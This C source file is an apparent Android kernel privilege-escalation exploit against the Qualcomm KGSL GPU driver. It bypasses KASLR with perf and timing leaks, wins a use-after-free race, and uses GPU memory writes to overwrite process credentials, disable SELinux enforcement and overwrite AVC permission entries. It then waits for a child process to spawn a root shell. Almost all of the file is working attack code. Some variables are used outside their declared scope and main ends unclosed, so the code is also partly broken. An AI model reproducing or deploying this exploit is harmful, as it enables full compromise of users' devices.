#include "root_shell.h"

static int kgsl_fd = -1;
static volatile int race_done = 0;
static volatile int dc_civac_works = -1;

static void sigill_handler(int sig) { (void)sig; dc_civac_works = 0; }

static void try_dc_civac(void *addr) {
    if (dc_civac_works == 0) return;
    void *old = signal(SIGILL, sigill_handler);
    __sync_synchronize();
    asm volatile("dc civac, %0" : : "r"(addr) : "memory");
    asm volatile("dsb sy" : : : "memory");
    __sync_synchronize();
    signal(SIGILL, old);
    if (dc_civac_works == -1) dc_civac_works = 1;
}

static void flush_dc_civac_range(void *start, size_t len) {
    if (dc_civac_works != 1) return;
    char *p = (char*)((uintptr_t)start & ~63);
    char *end = (char*)((uintptr_t)start + len);
    for (; p < end; p += 64) try_dc_civac(p);
}

static void die(const char *msg) { perror(msg); exit(1); }

static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}
#if defined(__aarch64__)
static inline uint64_t read_virtual_counter(void) {
    uint64_t value;
    __asm__ volatile("isb\n\tmrs %0, cntvct_el0\n\tisb" : "=r"(value));
    return value;
}

static uint64_t measure_prefetch(uintptr_t address) {
    __asm__ volatile("dsb sy\n\tisb" ::: "memory");
    uint64_t started = read_virtual_counter();
    for (int i = 0; i < 1024; ++i) {
        __asm__ volatile("prfm pldl1keep, [%0]" : : "r"(address) : "memory");
    }
    __asm__ volatile("dsb sy\n\tisb" ::: "memory");
    return read_virtual_counter() - started;
}

static uint64_t measure_syscall_register(uintptr_t address) {
    register uint64_t x0 __asm__("x0") = address;
    register uint64_t x8 __asm__("x8") = SYS_getpid;
    __asm__ volatile("dsb sy\n\tisb" ::: "memory");
    uint64_t started = read_virtual_counter();
    for (int i = 0; i < 32; ++i) {
        x0 = address;
        __asm__ volatile("svc #0" : "+r"(x0) : "r"(x8) : "memory", "cc");
    }
    __asm__ volatile("isb" ::: "memory");
    return read_virtual_counter() - started;
}

static int compare_u64(const void *left, const void *right) {
    uint64_t a = *(const uint64_t *)left;
    uint64_t b = *(const uint64_t *)right;
    return (a > b) - (a < b);
}

static uint64_t filtered_measurement(uintptr_t address,
                                     uint64_t (*measure)(uintptr_t)) {
    uint64_t samples[128];
    for (size_t i = 0; i < sizeof(samples) / sizeof(samples[0]); ++i) {
        samples[i] = measure(address);
    }
    qsort(samples, sizeof(samples) / sizeof(samples[0]), sizeof(samples[0]),
          compare_u64);
    uint64_t sum = 0;
    for (size_t i = 0; i < 16; ++i) {
        sum += samples[i];
    }
    return sum / 16;
}

static uint64_t detect_kaslr_timing(void) {
    printf("[*] Trying timing-based KASLR detection (fallback)\n");
    for (uintptr_t offset = 0; offset <= 0x1f0000; offset += 0x10000) {
        uintptr_t address = 0xffffffc080000000ULL + offset;
        uint64_t prefetch = filtered_measurement(address, measure_prefetch);
        uint64_t syscall_reg = filtered_measurement(address, measure_syscall_register);
        if (prefetch > 1000 && syscall_reg > 1000) {
            uint64_t base = address & ~0x1FFFFFULL;
            printf("[+] Timing: possible base = 0x%lx\n", base);
            return base;
        }
    }
    return 0;
}
#endif

static uint64_t detect_kaslr(uint64_t *base_out) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;

    int fd = perf_open(&pe, 0, -1, -1, 0);
    if (fd < 0) { 
        printf("  perf_open: errno=%d, trying fallback\n", errno);
#if defined(__aarch64__)
        uint64_t base = detect_kaslr_timing();
        if (base) {
            *base_out = base;
            return base + OFFSET_INIT_CRED;
        }
#endif
        return 0;
    }

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;
    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_kernel_ip = 0;
    int n_ips = 0;

    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            n_ips++;
            uint64_t ip = *(uint64_t *)(hdr + 1);
            if (first_kernel_ip == 0) first_kernel_ip = ip;
            if (n_ips <= 3) printf("    IP[%d]=0x%lX\n", n_ips, (unsigned long)ip);
        }
        tail += hdr->size;
    }

    munmap(buf, mmap_size); close(fd);
    printf("    kernel_samples=%d\n", n_ips);

    if (n_ips == 0) { printf("  perf: no kernel IPs\n"); return 0; }

    uint64_t base_addr = first_kernel_ip & ~0x1FFFFFULL;
    uint64_t init_cred_addr = base_addr + OFFSET_INIT_CRED;
    *base_out = base_addr;

    printf("    base_addr=0x%lX init_cred=0x%lX\n",
        (unsigned long)base_addr, (unsigned long)init_cred_addr);
    return init_cred_addr;
}

static int gpuobj_alloc(int fd, uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
    return a.id;
}

static void *gpuobj_mmap(int fd, size_t size, unsigned int id) {
    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, (off_t)id << 12);
    if (p == MAP_FAILED) die("gpuobj_mmap");
    return p;
}

static int gpuobj_info(int fd, unsigned int id, uint64_t *gpuaddr, uint64_t *flags) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0) {
        if (gpuaddr) *gpuaddr = inf.gpuaddr;
        if (flags) *flags = inf.flags;
    }
    return ret;
}

static void gpuobj_free(int fd, unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
}

static unsigned int create_context(int fd) {
    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
    return c.drawctxt_id;
}

static int wait_timestamp(int fd, unsigned int ctx_id, unsigned int target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
    for (int i = 0; i < 100000; i++) {
        if (ioctl(fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
        if (r.timestamp >= target) return 0;
        usleep(100);
    }
    return -2;
}

static uint32_t pm4_parity(uint32_t v) {
    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
}

static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
}

static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
    *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32);
}

static int submit_ib(int fd, unsigned int ctx_id, uint64_t ib_gpuaddr,
    size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
    struct kgsl_command_object cmd_obj = {
        .gpuaddr = ib_gpuaddr, .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB, .id = ib_id
    };
    struct kgsl_gpu_command gc = {0};
    gc.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
    gc.cmdsize = sizeof(cmd_obj);
    gc.numcmds = 1;
    gc.context_id = ctx_id;
    int ret = ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gc);
    if (out_ts) *out_ts = gc.timestamp;
    return ret;
}

static void *race_thread(void *arg) {
    (void)arg;
    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
    struct kgsl_gpuobj_import imp = {
        .priv = (uint64_t)&uaddr, .priv_len = BOGUS_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP, .type = KGSL_USER_MEM_TYPE_ADDR,
    };
    while (!race_done) ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
    return NULL;
}

static void gen_avc_entries_heavy(void) {
    for (int pid = 1; pid <= 5000; pid++) {
        char path[64];
        snprintf(path, sizeof(path), "/proc/%d/status", pid);
        int fd = open(path, O_RDONLY);
        if (fd >= 0) {
            char tmp[64];
            read(fd, tmp, 64);
            close(fd);
        }
        snprintf(path, sizeof(path), "/proc/%d/cmdline", pid);
        fd = open(path, O_RDONLY);
        if (fd >= 0) close(fd);
    }
    for (int i = 0; i < 500; i++) {
        char path[64];
        snprintf(path, sizeof(path), "/sys/fs/selinux/class/%d", i % 100);
        int fd = open(path, O_RDONLY);
        if (fd >= 0) close(fd);
        fd = open("/sys/fs/selinux/enforce", O_RDONLY);
        if (fd >= 0) close(fd);
        fd = open("/sys/fs/selinux/policy", O_RDONLY);
        if (fd >= 0) close(fd);
    }
}

static void dump_avc_page(uint64_t va, uint32_t *d, int n_slots) {
    printf("\n  AVC candidate @ 0x%llx\n", (unsigned long long)va);
    int shown = 0;
    for (int slot = 0; slot < 56 && shown < n_slots; slot++) {
        int idx = slot * 72 / 4;
        if (idx + 13 >= AVC_SCAN_DWORDS) break;
        uint32_t ssid = d[idx];
        uint32_t tsid = d[idx+1];
        uint32_t tclass = d[idx+2] & 0xFFFF;
        uint32_t allowed = d[idx+3];
        uint64_t pprev = ((uint64_t)d[idx+13] << 32) | d[idx+12];
        uint32_t pprev_hi = d[idx+13];
        if (ssid > 0 && ssid < 10000 && tsid > 0 && tsid < 10000 &&
            tclass > 0 && tclass < 1000 && (pprev_hi >> 16) == 0xFFFF) {
            printf("  [%2d] ssid=%-5u tsid=%-5u tclass=%-3u allowed=0x%08x pprev=0x%012llx\n",
                   slot, ssid, tsid, tclass, allowed, (unsigned long long)pprev & 0xFFFFFFFFFFFFULL);
            shown++;
        }
    }
}

static void print_context_info(void) {
    char context[256] = "unknown";
    int fd = open("/proc/self/attr/current", O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, context, sizeof(context)-1);
        if (n > 0) {
            context[n] = 0;
            context[strcspn(context, "\r\n")] = 0;
        }
        close(fd);
    }
    printf("[*] SELinux context: %s\n", context);
}

int main(int argc, char **argv) {
    (void)argc; (void)argv;
    setbuf(stdout, NULL);
    print_context_info();

    int enforce_fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (enforce_fd >= 0) {
        char val;
        if (read(enforce_fd, &val, 1) == 1) {
            printf("[*] SELinux enforce = %c (%s)\n", val, val == '0' ? "permissive" : "enforcing");
        }
        close(enforce_fd);
    }

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    printf("[+] kgsl fd=%d\n", kgsl_fd);

    printf("[*] Phase 0: Dynamic KASLR detection via perf (fallback timing if needed)\n");
    uint64_t kernel_base;
    uint64_t init_cred_addr = detect_kaslr(&kernel_base);
    if (!init_cred_addr) {
        printf("[-] Failed to detect init_cred, aborting\n");
        return 1;
    }
    printf("  init_cred=0x%lX\n", init_cred_addr);

    uint64_t selinux_state_addr = kernel_base + OFFSET_SELINUX_STATE;
    printf("[*] Calculated selinux_state=0x%lX\n", (unsigned long)selinux_state_addr);

    uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
    printf("[*] Phase 1: Setup rbtree\n");
    int uaf_id = gpuobj_alloc(kgsl_fd, UAF_SIZE, alloc_flags);
    void *uaf_m = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
    if (uaf_m == MAP_FAILED) die("mmap UAF");
    munmap(uaf_m, UAF_SIZE);

    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
        MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) die("mmap BOGUS");

    int ph_id = gpuobj_alloc(kgsl_fd, PLACEHOLDER_SIZE, alloc_flags);
    void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE,
        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
    if (ph_m == MAP_FAILED) die("mmap PLACEHOLDER");

    printf("  UAF=0x%lx BOGUS=0x%lx PLACEHOLDER=0x%lx\n",
        (unsigned long)UAF_ADDR, (unsigned long)BOGUS_ADDR,
        (unsigned long)PLACEHOLDER_ADDR);

    printf("[*] Phase 2: Race\n");
    int ov_id = gpuobj_alloc(kgsl_fd, OVERLAP_SIZE, alloc_flags);

    pthread_t thr;
    if (pthread_create(&thr, NULL, race_thread, NULL) != 0) die("pthread");

    int hit = 0;
    for (int i = 0; i < 5000000; i++) {
        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
            PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
            kgsl_fd, (off_t)ov_id << 12);
        int e = errno;
        if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
        if (e == ENODEV) { hit = 1; break; }
        if (i % 500000 == 0) printf("  race %d/%d errno=%d\n", i, 5000000, e);
    }

    race_done = 1;
    pthread_join(thr, NULL);

    if (!hit) { printf("[-] Race failed\n"); close(kgsl_fd); return 1; }
    printf("[+] Race won! (errno=ENODEV)\n");

    printf("[*] Phase 3: Free UAF\n");
    gpuobj_free(kgsl_fd, uaf_id);
    printf("[+] UAF freed\n");

    printf("[*] Phase 4: Reclaim pages\n");
    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
    if (rf >= 0) { write(rf, "1", 1); close(rf); }
    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (rf >= 0) { write(rf, "3", 1); close(rf); }
    usleep(10000);

    printf("[*] Phase 5: Spawning %d AVC generation children\n", AVC_CHILD_COUNT);
    int avc_pipe[2];
    if (pipe(avc_pipe) < 0) die("pipe");
    fcntl(avc_pipe[0], F_SETFD, FD_CLOEXEC);
    fcntl(avc_pipe[1], F_SETFD, FD_CLOEXEC);

    for (int i = 0; i < AVC_CHILD_COUNT; i++) {
        pid_t p = fork();
        if (p == 0) {
            close(avc_pipe[0]);
            prctl(PR_SET_NAME, "AVCCHILD");
            gen_avc_entries_heavy();
            write(avc_pipe[1], "G", 1);
            close(avc_pipe[1]);
            _exit(0);
        }
    }
    close(avc_pipe[1]);
    for (int i = 0; i < AVC_CHILD_COUNT; i++) {
        char c;
        read(avc_pipe[0], &c, 1);
    }
    close(avc_pipe[0]);
    printf("  All AVC children done\n");

    printf("[*] Phase 6: Spawning task_struct spray (%d children)\n", SPRAY_PIDS);
    int notify_pipe[2];
    if (pipe(notify_pipe) < 0) die("pipe");
    fcntl(notify_pipe[0], F_SETFD, FD_CLOEXEC);
    fcntl(notify_pipe[1], F_SETFD, FD_CLOEXEC);

    pid_t spray_pids[SPRAY_PIDS];
    int n_spray = 0;
    for (int i = 0; i < SPRAY_PIDS; i++) {
        pid_t p = fork();
        if (p == 0) {
            close(notify_pipe[0]);
            prctl(PR_SET_NAME, "TASKUAF!!");
            for (int j = 0; j < 1800; j++) {
                usleep(200000);
                if (getuid() == 0) {
                    usleep(50000);
                    pid_t me = getpid();
                    write(notify_pipe[1], &me, sizeof(me));
                    execl("/system/bin/sh", "sh", NULL);
                    _exit(0);
                }
            }
            close(notify_pipe[1]);
            _exit(0);
        }
        if (p > 0) spray_pids[n_spray++] = p;
        else break;
    }
    close(notify_pipe[1]);
    printf("  Spawned %d children\n", n_spray);

    printf("[*] Phase 7: GPU scan for cred pages (pattern 0x000007D0)\n");
    unsigned int ctx_id = create_context(kgsl_fd);
    int ib_id = gpuobj_alloc(kgsl_fd, 0x10000, alloc_flags);
    void *ib_m = gpuobj_mmap(kgsl_fd, 0x10000, ib_id);
    uint64_t ib_ga = 0, ib_flags = 0;
    gpuobj_info(kgsl_fd, ib_id, &ib_ga, &ib_flags);
    int dst_id = gpuobj_alloc(kgsl_fd, 0x4000, alloc_flags);
    void *dst_m = gpuobj_mmap(kgsl_fd, 0x4000, dst_id);
    uint64_t dst_ga = 0, dst_flags = 0;
    gpuobj_info(kgsl_fd, dst_id, &dst_ga, &dst_flags);

    uint64_t scan_start = UAF_ADDR + 0x1000;
    uint64_t end_va = UAF_ADDR + UAF_SIZE - 0x1000;
    uint64_t cred_pages[32];
    int cred_offs[32];
    int n_cred = 0;
    int sec_offset = -1;

    for (uint64_t va = scan_start; va < end_va && n_cred < 1; va += 0x1000) {
        if (((va - scan_start) & 0xFFFFF) == 0) printf(".");
        memset(ib_m, 0, 0x10000);
        memset(dst_m, 0, 0x1000);
        uint32_t *cmd = (uint32_t *)ib_m;
        int dw = 0;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        for (int i = 0; i < SCAN_DWORDS; i++) {
            uint32_t dl, dh, sl, sh;
            split64(dst_ga + i * 4, &dl, &dh);
            split64(va + i * 4, &sl, &sh);
            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
            cmd[dw++] = 0;
            cmd[dw++] = dl; cmd[dw++] = dh;
            cmd[dw++] = sl; cmd[dw++] = sh;
        }
        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        unsigned int ts;
        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
        if (wait_timestamp(kgsl_fd, ctx_id, ts) < 0) break;
        __sync_synchronize();

        uint32_t *data = (uint32_t *)dst_m;
        int cred_off_found = -1;
        for (int i = 0; i < SCAN_DWORDS - 8; i++) {
            int cnt = 0;
            for (int j = 0; j < 8; j++)
                if (data[i + j] == 0x000007D0) cnt++;
            if (cnt >= 3) { cred_off_found = i * 4; break; }
        }
        if (cred_off_found >= 0 && n_cred < 32) {
            printf("\n  [CRED] va=0x%lx off=0x%x\n", (unsigned long)va, cred_off_found);
            cred_pages[n_cred] = va;
            cred_offs[n_cred] = cred_off_found;
            n_cred++;

            if (sec_offset == -1) {
                for (int off = 0x30; off < SCAN_DWORDS * 4 - 8; off += 8) {
                    uint64_t val = ((uint64_t)data[off/4+1] << 32) | data[off/4];
                    if ((val >> 40) == 0xFFFFFF) {
                        sec_offset = off;
                        break;
                    }
                }
                if (sec_offset == -1) {
                    sec_offset = 0x60;
                    printf("  using fallback security offset 0x%x\n", sec_offset);
                } else {
                    printf("  found security pointer offset 0x%x\n", sec_offset);
                }
            }
        }
    }
    printf("\n[*] Phase 7 complete: found %d cred pages\n", n_cred);

    if (n_cred == 0) {
        printf("[-] No cred pages found, aborting\n");
        return 1;
    }

    printf("[*] Phase 8: Overwrite cred fields (uid=0, caps=full, security=kernel SID)\n");
    for (int p = 0; p < n_cred && p < 32; p++) {
        uint64_t cbase = cred_pages[p] + cred_offs[p];
        uint32_t *cmd = (uint32_t *)ib_m;
        int dw = 0;
        memset(ib_m, 0, 0x10000);
        cmd[dw++] = cp_type7(CP_NOP, 0);

        uint64_t uid_base = cbase + 0x04;
        for (int i = 0; i < 8; i++) {
            uint32_t al, ah;
            split64(uid_base + i * 4, &al, &ah);
            cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
            cmd[dw++] = al; cmd[dw++] = ah;
            cmd[dw++] = 0;
        }

        uint64_t cap_base = cbase + 0x28;
        for (int i = 0; i < 4; i++) {
            uint32_t al, ah;
            split64(cap_base + i * 8, &al, &ah);
            cmd[dw++] = cp_type7(CP_MEM_WRITE, 5);
            cmd[dw++] = al; cmd[dw++] = ah;
            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0xFFFFFFFF;
        }

        if (sec_offset >= 0) {
            uint64_t sec_addr_base = cbase + sec_offset;
            uint64_t fake_sec_addr = cred_pages[p] + 0xFB0;
            uint32_t al, ah;
            split64(sec_addr_base, &al, &ah);
            cmd[dw++] = cp_type7(CP_MEM_WRITE, 5);
            cmd[dw++] = al; cmd[dw++] = ah;
            split64(fake_sec_addr, &al, &ah);
            cmd[dw++] = al; cmd[dw++] = ah;
        }

        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        unsigned int ts;
        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
            wait_timestamp(kgsl_fd, ctx_id, ts);
    }

    for (int p = 0; p < n_cred; p++) {
        uint32_t *page = (uint32_t *)cred_pages[p];
        page[0xFB0 / 4] = 1;
    }

    flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
    printf("[+] Cred overwrite and security pointer redirection done\n");

    printf("[*] Phase 9: Aggressive SELinux disabling\n");

    memset(ib_m, 0, 0x10000);
    memset(dst_m, 0, 0x1000);
    cmd = (uint32_t *)ib_m;
    dw = 0;
    cmd[dw++] = cp_type7(CP_NOP, 0);
    for (int i = 0; i < SELINUX_STATE_SCAN_SIZE / 4; i++) {
        uint32_t dl, dh, sl, sh;
        split64(dst_ga + i * 4, &dl, &dh);
        split64(selinux_state_addr + i * 4, &sl, &sh);
        cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
        cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
        cmd[dw++] = sl; cmd[dw++] = sh;
    }
    cmd[dw++] = cp_type7(CP_NOP, 0);
    __sync_synchronize();
    if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
        wait_timestamp(kgsl_fd, ctx_id, ts);
    __sync_synchronize();

    uint32_t *state_data = (uint32_t *)dst_m;
    int enforcing_offset = -1;
    for (int i = 0; i < SELINUX_STATE_SCAN_SIZE / 4; i++) {
        if (state_data[i] == 1) {
            int zero_around = 0;
            for (int j = -2; j <= 2; j++) {
                int idx = i + j;
                if (idx >= 0 && idx < SELINUX_STATE_SCAN_SIZE / 4) {
                    if (state_data[idx] == 0) zero_around++;
                }
            }
            if (zero_around >= 3) {
                enforcing_offset = i * 4;
                break;
            }
        }
    }

    if (enforcing_offset >= 0) {
        printf("  Found enforcing flag at offset 0x%x (value = 1)\n", enforcing_offset);
        uint64_t enforcing_addr = selinux_state_addr + enforcing_offset;
        memset(ib_m, 0, 0x10000);
        cmd = (uint32_t *)ib_m;
        dw = 0;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        uint32_t al, ah;
        split64(enforcing_addr, &al, &ah);
        cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
        cmd[dw++] = al; cmd[dw++] = ah;
        cmd[dw++] = 0;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
            wait_timestamp(kgsl_fd, ctx_id, ts);
        flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
        printf("[+] SELinux enforcing flag zeroed\n");
    } else {
        printf("  Could not find enforcing flag; zeroing first 0x%x bytes of selinux_state\n", SELINUX_STATE_SCAN_SIZE);
        memset(ib_m, 0, 0x10000);
        cmd = (uint32_t *)ib_m;
        dw = 0;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        for (int off = 0; off < SELINUX_STATE_SCAN_SIZE; off += 4) {
            uint64_t addr = selinux_state_addr + off;
            uint32_t al2, ah2;
            split64(addr, &al2, &ah2);
            cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
            cmd[dw++] = al2; cmd[dw++] = ah2;
            cmd[dw++] = 0;
        }
        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
            wait_timestamp(kgsl_fd, ctx_id, ts);
        flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
        printf("[+] Zeroed %d bytes of selinux_state\n", SELINUX_STATE_SCAN_SIZE);
    }

    printf("[*] Phase 9b: AVC bypass fallback\n");
    uint64_t avc_vas[256];
    int n_avc = 0;
    uint64_t avc_scan_start = UAF_ADDR;
    for (uint64_t va = avc_scan_start; va < end_va && n_avc < 256; va += 0x1000) {
        if (((va - avc_scan_start) & 0xFFFFF) == 0) printf(".");
        memset(ib_m, 0, 0x10000);
        memset(dst_m, 0, 0x1000);
        cmd = (uint32_t *)ib_m;
        dw = 0;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        for (int i = 0; i < AVC_SCAN_DWORDS; i++) {
            uint32_t dl, dh, sl, sh;
            split64(dst_ga + i * 4, &dl, &dh);
            split64(va + i * 4, &sl, &sh);
            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
            cmd[dw++] = sl; cmd[dw++] = sh;
        }
        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
        if (wait_timestamp(kgsl_fd, ctx_id, ts) < 0) break;
        __sync_synchronize();

        uint32_t *d = (uint32_t *)dst_m;
        int ahits = 0;
        for (int ofs = 0; ofs < 4032; ofs += 72) {
            int idx = ofs / 4;
            if (idx + 13 >= AVC_SCAN_DWORDS) break;
            uint32_t ssid = d[idx];
            uint32_t tsid = d[idx+1];
            uint32_t tclass = d[idx+2] & 0xFFFF;
            if (ssid > 0 && ssid < 10000 && tsid > 0 && tsid < 10000 &&
                tclass > 0 && tclass < 1000) {
                ahits++;
            }
        }
        if (ahits >= 3) {
            dump_avc_page(va, d, ahits > 20 ? 20 : ahits);
            avc_vas[n_avc] = va;
            n_avc++;
        }
    }
    printf("\n[*] Found %d AVC pages\n", n_avc);

    if (n_avc > 0) {
        printf("[*] Overwriting AVC allowed fields\n");
        for (int p = 0; p < n_avc; p++) {
            memset(ib_m, 0, 0x10000);
            cmd = (uint32_t *)ib_m;
            dw = 0;
            cmd[dw++] = cp_type7(CP_NOP, 0);
            for (int slot = 0; slot < 4032; slot += 72) {
                uint64_t allowed_addr = avc_vas[p] + slot + 12;
                uint32_t al2, ah2;
                split64(allowed_addr, &al2, &ah2);
                cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
                cmd[dw++] = al2; cmd[dw++] = ah2;
                cmd[dw++] = 0xFFFFFFFF;
            }
            cmd[dw++] = cp_type7(CP_NOP, 0);
            __sync_synchronize();
            if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
                wait_timestamp(kgsl_fd, ctx_id, ts);
        }
        flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
        printf("[+] AVC allowed overwritten\n");
    }

    enforce_fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (enforce_fd >= 0) {
        char val;
        if (read(enforce_fd, &val, 1) == 1) {
            printf("[*] SELinux enforce = %c\n", val);
            if (val == '1') {
                printf("  Still enforcing; trying explicit zero of selinux_state+0\n");
                memset(ib_m, 0, 0x10000);
                cmd = (uint32_t *)ib_m;
                dw = 0;
                cmd[dw++] = cp_type7(CP_NOP, 0);
                uint64_t addr0 = selinux_state_addr;
                uint32_t al0, ah0;
                split64(addr0, &al0, &ah0);
                cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
                cmd[dw++] = al0; cmd[dw++] = ah0;
                cmd[dw++] = 0;
                cmd[dw++] = cp_type7(CP_NOP, 0);
                __sync_synchronize();
                if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
                    wait_timestamp(kgsl_fd, ctx_id, ts);
                flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
                printf("  Zeroed selinux_state+0\n");
            }
        }
        close(enforce_fd);
    }

    printf("[*] Phase 10: Cache eviction\n");
    void *ev = mmap(0, 0x2000000, PROT_READ|PROT_WRITE,
        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (ev != MAP_FAILED) {
        volatile char *p = (volatile char *)ev;
        for (uint64_t o = 0; o < 0x2000000; o += 64) p[o] = 0;
        munmap(ev, 0x2000000);
    }
    sleep(1);

    printf("[*] Phase 11: Waiting for root shell...\n");
    close(notify_pipe[1]);
    struct pollfd pfd = { .fd = notify_pipe[0], .events = POLLIN };
    pid_t winner = 0;
    if (poll(&pfd, 1, 15000) > 0 &&
        read(notify_pipe[0], &winner, sizeof(winner)) == sizeof(winner)) {
        printf("[+] ROOT! uid=0 at PID %d\n", winner);
        printf("＼(^o^)／\n");
        for (int i = 0; i < n_spray; i++)
            if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
        while (waitpid(-1, NULL, WNOHANG) > 0);
        printf("\n  # ROOT SHELL (uid=0, SELinux kernel context) - type exit to quit\n  # ");
        fflush(stdout);
        waitpid(winner, NULL, 0);
        printf("[-] Root shell exited\n");
    } else {
        printf("[-] No child got uid=0\n");
        printf("(TдT)\n");
    }
    close(notify_pipe[0]);

